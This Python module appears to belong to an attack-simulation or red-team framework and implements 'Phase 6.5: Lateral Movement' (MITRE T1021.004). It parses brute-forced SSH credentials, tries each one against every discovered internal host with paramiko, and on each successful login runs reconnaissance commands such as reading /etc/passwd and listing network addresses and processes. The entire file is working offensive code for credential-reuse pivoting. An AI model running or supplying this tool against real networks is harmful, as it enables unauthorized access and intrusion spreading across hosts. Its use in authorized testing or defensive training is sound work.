#!/usr/bin/env python3
"""
Phase 6.5: Lateral Movement
Attempts SSH-based lateral movement from discovered credentials to other internal hosts.

MITRE ATT&CK: T1021.004 — Remote Services: SSH
"""

import logging
import socket

import paramiko

from .base_attacker import BaseAttacker

logger = logging.getLogger(__name__)


class LateralMovement(BaseAttacker):
    """
    Uses credentials obtained during SSH brute-force (Phase 6) to pivot to other
    hosts discovered during reconnaissance (Phase 4).
    """

    # Commands to run on each successfully reached host
    POST_ACCESS_COMMANDS = [
        "whoami",
        "hostname",
        "id",
        "uname -a",
        "cat /etc/passwd | head -5",
        "ip addr show | grep 'inet '",
        "ps aux | head -10",
    ]

    def __init__(self, frontend_url: str = "http://frontend:3000") -> None:
        super().__init__(frontend_url)

    def _parse_credentials(self, ssh_login_strings: list) -> list:
        """
        Parse successful SSH login strings of the form 'SSH_SUCCESS:user:pass@host'
        into a list of (host, username, password) tuples.
        """
        credentials = []
        for entry in ssh_login_strings:
            try:
                # Format: SSH_SUCCESS:username:password@host
                after_prefix = entry.split("SSH_SUCCESS:")[1]
                user_pass, host = after_prefix.rsplit("@", 1)
                username, password = user_pass.split(":", 1)
                credentials.append((host.strip(), username.strip(), password.strip()))
            except Exception as e:
                logger.warning("Could not parse SSH credential entry '%s': %s", entry, e)
        return credentials

    def _try_ssh_connect(self, host: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient | None:
        """Attempt an SSH connection; return the client on success or None on failure."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=10,
                banner_timeout=10,
                auth_timeout=10,
                allow_agent=False,
                look_for_keys=False,
            )
            return client
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.error, OSError) as e:
            logger.debug("Connection to %s@%s failed: %s", username, host, e)
            client.close()
            return None

    def _run_post_access_commands(self, client: paramiko.SSHClient, host: str, username: str) -> dict:
        """Run reconnaissance commands on the newly accessed host and return their output."""
        results = {}
        for cmd in self.POST_ACCESS_COMMANDS:
            try:
                _, stdout, stderr = client.exec_command(cmd, timeout=8)
                output = stdout.read().decode(errors="replace").strip()
                error = stderr.read().decode(errors="replace").strip()
                results[cmd] = output or error or "(no output)"
                logger.info("   [%s] $ %s", host, cmd)
                logger.info("   %s", (output or error or "(no output)")[:200])
            except Exception as e:
                logger.error("   Command '%s' on %s failed: %s", cmd, host, e)
                results[cmd] = f"ERROR: {e}"
        return results

    def attempt_lateral_movement(
        self,
        discovered_hosts: list,
        successful_ssh_logins: list,
    ) -> list:
        """
        Phase 6.5: Lateral Movement via SSH (T1021.004).

        For every credential obtained in Phase 6, attempt to log in to every
        internal host discovered in Phase 4 (excluding the host the credential
        was originally obtained from).

        Returns a list of dicts with movement results.
        """
        logger.info("\n[LATERAL MOVEMENT] Attempting SSH pivot to internal hosts...")

        credentials = self._parse_credentials(successful_ssh_logins)
        if not credentials:
            logger.warning(
                "[LATERAL MOVEMENT] No parsed credentials available. "
                "Run SSH brute-force (Phase 6) first."
            )
            return []

        logger.info(
            "[LATERAL MOVEMENT] %d credential(s) to test across %d host(s)",
            len(credentials),
            len(discovered_hosts),
        )

        movement_results = []
        attempted = set()

        for cred_host, username, password in credentials:
            for target in discovered_hosts:
                # Skip the host we already own
                if target == cred_host:
                    continue

                key = (target, username)
                if key in attempted:
                    continue
                attempted.add(key)

                logger.info("-" * 50)
                logger.info(
                    "[PIVOT] Trying %s@%s (credential from %s)...",
                    username, target, cred_host,
                )

                client = self._try_ssh_connect(target, username, password)
                if client is None:
                    logger.info("   ❌ Access denied or unreachable")
                    continue

                logger.info("   ✅ LATERAL MOVEMENT SUCCESS: %s@%s", username, target)
                logger.info("   Credential reuse from: %s", cred_host)

                cmd_results = self._run_post_access_commands(client, target, username)
                client.close()

                movement_results.append({
                    "target_host": target,
                    "username": username,
                    "source_credential_host": cred_host,
                    "commands": cmd_results,
                })

        logger.info("-" * 50)
        if movement_results:
            logger.info("\n[LATERAL MOVEMENT SUMMARY] Successful pivots: %d", len(movement_results))
            for r in movement_results:
                logger.info(
                    "   ✅ %s@%s  (cred from %s)",
                    r["username"], r["target_host"], r["source_credential_host"],
                )
        else:
            logger.warning("\n[LATERAL MOVEMENT] No successful pivots — credentials did not reuse.")

        return movement_results
